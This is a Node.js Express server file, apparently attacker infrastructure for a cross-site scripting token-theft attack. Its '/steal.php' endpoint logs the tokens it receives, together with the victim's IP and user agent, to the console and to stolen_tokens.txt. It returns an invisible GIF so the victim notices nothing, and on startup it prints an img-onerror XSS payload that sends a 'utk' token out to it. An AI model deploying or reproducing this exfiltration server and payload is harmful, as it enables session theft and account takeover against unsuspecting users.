const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS so the victim's browser allows the request
app.use(cors());

// The "Steal" Endpoint
// Matches the payload: http://attacker.com/steal.php?token=...
app.get('/steal.php', (req, res) => {
    const token = req.query.token;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    if (token) {
        const logEntry = `[${timestamp}] IP: ${ip} | Token: ${token} | UA: ${userAgent}\n`;
        
        // 1. Log to Console (Instant Feedback)
        console.log(`\n[+] 💰 JACKPOT! STOLEN TOKEN: ${token}`);
        console.log(`    From IP: ${ip}`);

        // 2. Save to File (Persistence)
        fs.appendFile(path.join(__dirname, 'stolen_tokens.txt'), logEntry, (err) => {
            if (err) console.error('Error saving to file:', err);
        });
    }

    // 3. Stealth Mode: Return a 1x1 transparent GIF so the user sees nothing broken
    // This prevents a "broken image" icon from showing up in the chat
    const img = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Content-Length': img.length
    });
    res.end(img);
});

// Default route to verify it's running
app.get('/', (req, res) => {
    res.send('<h1>👾 Attacker Server is Online 👾</h1><p>Ready to listen for incoming tokens...</p>');
});

app.listen(PORT, () => {
    console.log(`\n[!] Attacker Server Running on port ${PORT}`);
    console.log(`[!] Test Payload: <img src=x onerror="new Image().src='http://localhost:${PORT}/steal.php?token='+utk">`);
});
